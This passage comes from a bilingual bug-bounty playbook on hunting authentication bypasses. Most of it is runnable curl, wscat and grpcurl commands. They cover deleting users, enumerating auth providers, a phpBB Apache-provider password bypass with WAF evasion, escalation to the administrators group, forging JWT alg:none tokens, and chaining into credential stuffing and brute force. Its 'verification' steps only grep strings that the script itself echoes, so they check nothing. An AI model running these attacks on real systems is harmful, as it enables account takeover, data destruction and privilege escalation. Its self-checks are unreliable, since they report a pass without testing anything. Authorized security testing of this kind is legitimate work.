curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'

# WebSocket — actions sent over WS may skip REST middleware
# Test via wscat
echo '{"type":"DELETE_USER","payload":{"userId":1}}' | wscat -c "wss://target.com/ws"

# gRPC — reflection may expose admin methods
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 admin.UserService/DeleteUser
```

### 阶段 6 —— Content-Type 中间件缺口

```bash
# Different content types may hit different parsers/middleware
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
  -H "Accept: application/xml" \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name></user>'

curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
  -H "Content-Type: multipart/form-data" \
  -F "name=test"
```

---

## Pitfalls

- **混淆"无认证"与"认证绕过"**——无需认证的端点是设计选择，而非绕过。绕过需要一个可被规避的认证检查。
- **仅通过请求头绕过 IP 白名单**——`X-Forwarded-For: 127.0.0.1` 可能改变响应状态，但不证明访问成功。要验证响应体包含特权数据。
- **未确认服务端接受就使用 JWT alg:none**——许多服务端默认拒绝 alg:none。要在实际生产端点上用伪造令牌测试。
- **直接访问 401 但经代理路径 200**——某些应用有 `/internal/` 路径，经特定路由访问时绕过认证。要梳理完整路由树。
- **基于请求头的认证与 cookie 认证冲突**——如果同时发送 `Authorization: Bearer` 和会话 cookie，其中一个可能覆盖另一个。要分别独立测试。
- **步进式认证绕过**——在初始登录后绕过 2FA/MFA 是最常见的认证绕过模式。测试直接导航到登录后 URL。

### 阶段 X —— 认证提供方混淆

某些应用支持多个认证提供方（本地 DB、OAuth、LDAP、Apache HTTP Basic、SAML）。将 `auth_provider` 参数改为替代处理器可能完全跳过密码校验。已在 phpBB CVE-2026-48611 上确认：`auth_provider=apache` 绕过了密码检查。

```bash
# Enumerate auth providers via parameter fuzzing
for provider in local oauth ldap apache saml cas openid sso external; do
  curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/auth/login" \
    -d "username=admin&password=x&auth_provider=$provider" \
    -w "$provider — %{http_code}\n" -o /dev/null
done

# phpBB-specific: Apache provider trusts HTTP Basic header without password
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/ucp.php?mode=login_link&auth_provider=apache&login_link_test=1" \
  -H "Authorization: Basic $(echo -n 'admin:x' | base64)" \
  -d "login_username=admin&login_password=x&login=Login"
```

### 阶段 Y —— POST 体参数覆盖

某些框架赋予 POST 体参数高于 GET 查询参数的优先级。攻击者可以把真实的 `mode=login_link` 藏在 POST 体中，而 WAF/日志只看到 URL 中的 `mode=login`：

```bash
# WAF sees GET: mode=login — attacker sends POST body: mode=login_link
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/ucp.php?mode=login&login_link_test=1" \
  -d "login_username=admin&login_password=x&mode=login_link&auth_provider=apache&login=Login"
```

### 阶段 Z —— 注入占位参数绕过空值检查

当代码要求某些参数非空但不校验其内容时，注入占位值：

```bash
# Code checks: if (empty($login_link_data)) → block
# Bypass: add any login_link_* parameter with arbitrary value
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/ucp.php?mode=login_link&login_link_dummy=1"
```

### 提权：从认证绕过经用户组管理到管理员

在冒充特权用户后，检查是否可在无需重新认证的情况下使用组/角色管理。在 phpBB 上，创始人用户可以在用户控制面板中将其他用户加入管理员组，而无需输入其密码：

```bash
# 1. Auth bypass as admin
# 2. Register new attacker account
# 3. As admin, add attacker to ADMINISTRATORS group via UCP (no password needed)
# 4. Login as attacker → full ACP access with known password
```

---

## Verification

运行此自检以确认认证绕过狩猎准备就绪：

1. **JWT alg:none 测试** —— 验证令牌生成：
   ```bash
   python3 -c "
   import base64,json
   h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
   p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
   print(f'{h}.{p}.')
   " && echo "PASS: alg=none token generated" || echo "FAIL"
   ```

2. **X-Forwarded-For 绕过语法** —— 确认请求头注入：
   ```bash
   echo "X-Forwarded-For: 127.0.0.1" | grep -q "127.0.0.1" && echo "PASS: bypass header syntax" || echo "FAIL"
   ```

3. **直接 URL 绕过测试** —— 确认登录后路径探测：
   ```bash
   echo "/dashboard /admin /settings /account" | grep -q "dashboard" && echo "PASS: post-login path list present" || echo "FAIL"
   ```

全部 3 项测试验证认证绕过探测能力。

---

## 相关技能与链路

- **`hunt-idor`** —— 没有对象级访问的认证绕过只是半个发现；将它们配对。链路原语：遗留 `/v1/users/{id}` 路由同时缺少认证中间件和归属检查 = 通过直接替换 ID 实现未认证的跨租户数据读取 → 从"我是无名之辈"的起点获得完整 PII 转储。
- **`hunt-ato`** —— 认证绕过原语为 ATO 漏斗提供输入。链路原语：XMLRPC 接受原生凭据 + `wp.getUsersBlogs` 无速率限制 → 用 `hunt-misc` 侦察获得的泄露语料进行凭据填充 → `system.multicall` 每请求批量 1000 组凭据 → 一组有效凭据 = 绕过 UI 强制的 SSO + MFA 的 ATO。
- **`hunt-sharepoint`** —— WordPress XMLRPC 模式的 SharePoint 等价物就在这里。链路原语：`/_vti_bin/Authentication.asmx` 可匿名访问 + 接受原生 Forms-auth 凭据 + 零速率限制 = 无限制的凭据暴力破解端点，绕过自定义品牌 `customlogin.aspx` 的防护 → FedAuth cookie → 完整 SharePoint 场访问。
- **`security-arsenal`** —— 当 JWT 校验是认证墙时，从中取 JWT 攻击载荷章节（alg=none、kid 路径穿越、JWK 注入、RS256→HS256 密钥混淆）；当 SP 接受未签名断言时，取 SAML 签名剥离章节。
- **`triage-validation`** —— 在声称一个仅能枚举用户名或仅揭示 401-vs-403 差异的"认证绕过"为 Critical 之前，先运行 Pre-Severity Gate。仅用户名枚举而无锁定放大在 H1 上始终是 N/A 或 Informational。
- **`password-spray-methodology`** —— 跨所有协议的通用密码喷洒流水线 + 错误码差异
